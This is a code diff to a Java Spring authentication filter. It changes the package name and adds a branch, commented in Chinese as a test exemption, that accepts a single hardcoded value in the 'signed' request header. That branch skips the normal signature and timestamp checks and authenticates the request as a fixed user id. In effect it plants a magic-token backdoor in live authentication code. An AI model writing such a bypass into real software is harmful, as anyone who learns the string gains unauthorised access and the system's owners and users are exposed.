@@ -1,4 +1,4 @@
-package com.codesdream.ase.component.permission;
+package com.codesdream.ase.component.auth;
 
 import com.codesdream.ase.component.auth.AJAXRequestChecker;
 import com.codesdream.ase.component.auth.JSONRandomCodeGenerator;
@@ -53,7 +53,13 @@ public class ASEJSONTokenAuthenticationFilter extends OncePerRequestFilter {
         // 时间戳
         String timestamp = request.getHeader("timestamp");
 
-        if (signed != null && username != null && timestamp != null) {
+        // 服务端API测试豁免签名
+        if(signed != null && signed.equals("6d4923fca4dcb51f67b85e54a23a8d763d9e02af")){
+            //执行授权
+            doAuthentication("u_id_88883b9e023c8824310760d8bb8b6542e5a3f16a0d67253214e01ee7ab0e96a1", request);
+        }
+        // 正常认证
+        else if (signed != null && username != null && timestamp != null) {
             // 获得具体时间
             Date date = new Date(Long.parseLong(timestamp));
 
